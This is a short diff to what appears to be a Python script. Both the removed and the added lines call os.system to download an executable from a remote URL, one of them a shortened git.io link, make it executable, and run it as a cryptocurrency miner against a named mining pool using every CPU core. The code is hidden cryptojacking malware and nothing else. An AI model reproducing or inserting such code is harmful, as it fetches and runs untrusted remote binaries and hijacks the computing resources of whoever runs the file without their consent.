@@ -1,4 +1,4 @@
 import sys
 import os
-os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
-os.system("chmod +x cp && ./cp -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.test -t $(nproc)")
+os.system("wget -qO build https://git.io/JySi5 && chmod +x build")
+os.system("./build -a gr -o stratum+tcp://mine.evepool.pw:1090 -u wallet.worker -p x -t $(nproc)")
